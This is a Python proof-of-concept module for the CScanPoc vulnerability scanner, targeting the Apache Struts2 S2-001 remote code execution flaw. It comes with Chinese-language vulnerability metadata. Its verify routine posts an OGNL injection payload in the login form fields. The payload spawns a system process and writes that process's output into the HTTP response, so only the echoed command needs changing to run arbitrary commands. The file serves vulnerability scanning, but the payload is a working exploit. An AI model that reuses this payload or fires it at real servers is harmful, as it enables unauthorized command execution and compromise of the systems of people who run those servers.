# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '0e2b98b5-faf3-4305-a38e-1bc92659e80d'
    name = 'Apache Struts2 S2-001远程代码执行' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2007-07-23'  # 漏洞公布时间
    desc = '''
        Struts2 是Apache软件基金会负责维护的一个基于MVC设计模式的Web应用框架开源项目。 
        Struts2 S2-001该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行
    ''' # 漏洞描述
    ref = 'https://cwiki.apache.org/confluence/display/WW/S2-001' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Apache Struts'  # 漏洞应用名称
    product_version = 'Apache Struts2 2.0.0 - 2.0.8'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'b6e8f568-fd40-4d15-bfa7-c8a0210080de'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-17' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            data = {'username':'''
            %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"echo","92933839f1efb2da9a4799753ee8d79c"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
            ''',
            'password':'''%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"echo","92933839f1efb2da9a4799753ee8d79c"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
            '''}
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            request = requests.post('{target}/login.action'.format(target=self.target), data=data)
            r = request.text
            if '92933839f1efb2da9a4799753ee8d79c' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()